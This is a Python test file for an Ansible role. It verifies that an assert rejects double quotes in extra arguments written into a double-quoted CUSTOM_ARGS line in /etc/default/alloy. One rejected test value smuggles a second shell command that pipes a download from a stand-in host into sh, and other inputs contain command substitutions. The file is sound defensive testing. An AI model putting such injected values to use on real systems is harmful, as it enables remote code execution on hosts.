"""The alloy_host guard on `alloy_host_extra_args`.

The role writes one managed line into /etc/default/alloy:

    CUSTOM_ARGS="--disable-reporting <joined extra args>"

The joined args land INSIDE a double-quoted shell assignment, so an entry
carrying a `"` closes it early and turns the remainder of the line into further
shell words — silently changing what the unit runs, with no error anywhere.
The role's `assert` is what stops that, and it is exactly the kind of guard a
refactor drops without failing anything: the molecule scenario never answers
`alloy_host_extra_args` with a hostile value, so the assert is skipped on an
empty loop and its removal is invisible.

These tests read the condition out of the role and evaluate it, so removing the
assert, widening its condition, or losing the loop over the variable all fail
here — no molecule run required.
"""

from __future__ import annotations

from pathlib import Path

import jinja2
import pytest
import yaml

REPO = Path(__file__).resolve().parent.parent
ROLE = REPO / "ansible_collections" / "weisssrv" / "infra" / "roles" / "alloy_host"
MAIN = ROLE / "tasks" / "main.yml"

QUOTE_ASSERT = "Assert no Alloy extra argument contains a double quote"
CUSTOM_ARGS = "Set Alloy command-line arguments"

TASKS = [t for t in yaml.safe_load(MAIN.read_text()) if isinstance(t, dict)]
NAMES = [str(t.get("name", "")) for t in TASKS]


def _task(name: str) -> dict:
    matches = [t for t in TASKS if str(t.get("name", "")) == name]
    assert len(matches) == 1, f"expected exactly one task named {name!r} in {MAIN}"
    return matches[0]


def _conditions() -> list[str]:
    return list(_task(QUOTE_ASSERT)["ansible.builtin.assert"]["that"])


def _accepts(arg: str) -> bool:
    """Evaluate the role's real assert condition against one loop item."""
    env = jinja2.Environment(undefined=jinja2.StrictUndefined)
    env.filters["bool"] = bool
    expression = " and ".join(f"({c})" for c in _conditions())
    return env.from_string("{{ (" + expression + ") | bool }}").render(item=arg) == "True"


def test_the_guard_exists_with_the_exact_condition() -> None:
    """Pinned literally: `'\"' not in item` is the whole guard, and a rewrite
    into something looser (`is not search`, a `| quote`) would still read as a
    quoting check while admitting the value that breaks the assignment."""
    assert _conditions() == ["'\"' not in item"]


def test_the_guard_covers_every_entry_of_the_variable() -> None:
    """A guard that checks one value, or a variable nobody answers, guards
    nothing — the loop over `alloy_host_extra_args` is half the assertion."""
    task = _task(QUOTE_ASSERT)
    assert task["loop"] == "{{ alloy_host_extra_args }}"


def test_the_guard_runs_before_the_line_is_written() -> None:
    """Asserting after the write would leave the broken CUSTOM_ARGS on disk."""
    assert NAMES.index(QUOTE_ASSERT) < NAMES.index(CUSTOM_ARGS)


def test_the_guarded_line_really_is_a_double_quoted_assignment() -> None:
    """The assert is only justified while the args are interpolated into a
    double-quoted assignment. If that line ever stops quoting this way, the
    condition above is pinning a rule that no longer matches the risk."""
    line = _task(CUSTOM_ARGS)["ansible.builtin.lineinfile"]["line"]
    assert line.startswith('CUSTOM_ARGS="') and line.endswith('"')
    assert "alloy_host_extra_args" in line


def test_the_failure_message_names_the_variable_and_the_consequence() -> None:
    fail_msg = _task(QUOTE_ASSERT)["ansible.builtin.assert"]["fail_msg"]
    assert "alloy_host_extra_args" in fail_msg
    assert "CUSTOM_ARGS" in fail_msg


@pytest.mark.parametrize(
    "arg",
    [
        "--server.http.listen-addr=0.0.0.0:12345",
        "--disable-reporting",
        "--storage.path=/var/lib/alloy/data",
        "--cluster.name=weisssrv",
        "",
    ],
)
def test_ordinary_arguments_are_accepted(arg: str) -> None:
    assert _accepts(arg) is True


@pytest.mark.parametrize(
    "arg",
    [
        '--cluster.name="prod"',
        '--x=a" ; curl http://evil.test/x | sh ; echo "',
        'trailing"',
        '"leading',
    ],
)
def test_an_embedded_double_quote_is_rejected(arg: str) -> None:
    """Each closes the CUSTOM_ARGS assignment early, so the value systemd hands
    ExecStart is a truncated one and whatever follows becomes further words —
    the unit runs something nobody wrote, and nothing reports an error."""
    assert _accepts(arg) is False


@pytest.mark.parametrize("arg", ["--x=$(id)", "--x=`id`", "--x=a b", "--x='q'"])
def test_the_guard_is_scoped_to_the_double_quote_it_names(arg: str) -> None:
    """Deliberately NOT a general shell-safety check. /etc/default/alloy is read
    by systemd as an EnvironmentFile, which parses quoting itself and never runs
    a shell — so `$(…)`/backticks are inert bytes there, while a `"` really does
    terminate the value. Pinning the scope keeps a later reviewer from reading
    this assert as broader protection than it gives, and stops it being widened
    into a filter that rejects legitimate arguments."""
    assert _accepts(arg) is True
